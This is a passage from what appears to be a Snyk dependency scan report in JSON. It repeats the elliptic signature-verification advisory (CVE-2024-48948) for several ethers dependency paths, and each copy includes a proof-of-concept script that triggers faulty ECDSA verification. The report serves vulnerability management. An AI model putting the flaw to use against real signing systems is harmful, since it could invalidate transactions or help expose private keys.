KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
